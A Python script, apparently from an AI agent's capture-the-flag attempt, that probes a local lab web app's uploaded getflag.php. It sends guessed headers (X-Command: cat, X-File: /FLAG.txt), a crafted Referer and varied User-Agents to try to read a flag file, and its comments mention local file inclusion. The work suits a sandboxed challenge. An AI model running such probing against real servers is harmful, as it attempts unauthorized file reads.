import requests

base_url = "http://127.0.0.1:32891"

print("[+] Final attempt - let me check if getflag.php accepts parameters in HTTP headers...")

# Try custom headers
headers_to_test = [
    {'X-Read-Flag': 'true'},
    {'X-Action': 'read'},
    {'X-Command': 'cat'},
    {'Authorization': 'read'},
    {'X-File': '/FLAG.txt'},
]

for headers in headers_to_test:
    resp = requests.get(f"{base_url}/posts/uploads/getflag.php", headers=headers)
    
    if "FLAG{" in resp.text:
        print(f"\n[!!!] FOUND FLAG with headers: {headers}!")
        print(resp.text)
        break

# Or maybe I need to look at the REFERRER
print("\n[+] Testing with Referer header...")

resp = requests.get(
    f"{base_url}/posts/uploads/getflag.php",
    headers={'Referer': f'{base_url}/post.php?id=uploads/getflag'}
)

print(f"With Referer: {resp.text[:200]}")

if "FLAG{" in resp.text:
    print("\n[!!!] FOUND FLAG with Referer!")
    print(resp.text)

# What if when included via LFI, $_SERVER variables change and affect behavior?
# Let me check if there's a way to trigger different behavior

print("\n[+] What if getflag.php reads FLAG.txt content directly when called in a specific way?")
print("[+] Let me try User-Agent modifications...")

user_agents = [
    'FlagReader/1.0',
    'GetFlag/1.0',
    'curl/7.68.0',
    'Mozilla/5.0 (compatible; FlagBot/1.0)',
]

for ua in user_agents:
    resp = requests.get(
        f"{base_url}/posts/uploads/getflag.php",
        headers={'User-Agent': ua}
    )
    
    if "FLAG{" in resp.text or len(resp.text) != 55:
        print(f"\nUA: {ua}")
        print(f"Response: {resp.text}")
        
        if "FLAG{" in resp.text:
            print("\n[!!!] FOUND FLAG!")
            break

